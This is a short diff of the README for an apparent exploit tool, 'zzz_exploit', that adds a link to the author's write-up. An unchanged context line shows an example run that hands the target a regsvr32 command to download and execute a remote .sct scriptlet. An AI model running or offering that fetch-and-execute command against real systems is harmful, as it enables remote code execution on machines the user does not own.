@@ -43,3 +43,4 @@ optional arguments:
   --version         show program's version number and exit
 Example: python zzz_exploit -t 192.168.0.1 -c 'regsvr32 /s /n /u /i:http://192.168.0.1:9000/1EsrjpXH2pWdgd.sct scrobj.dll'
 ```
+My write-up: https://mez0.cc/posts/weaponised-worawit.html
